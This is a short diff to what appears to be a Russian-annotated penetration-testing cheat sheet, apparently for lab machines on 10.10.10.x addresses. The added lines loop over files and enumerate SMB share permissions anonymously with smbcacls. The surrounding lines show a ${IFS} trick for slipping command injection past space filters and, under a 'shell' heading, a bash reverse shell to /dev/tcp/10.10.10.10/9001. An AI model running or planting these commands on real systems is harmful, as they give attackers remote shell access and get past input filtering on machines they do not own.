@@ -190,7 +190,8 @@ echo "pind -c 1 10.10.10.10" | sed 's/  /${IFS}/g'   ---> установка в�
     echo $i;
     done
     
+for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/Department Shares' $i;  done
+
 --оболочка
 
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
-
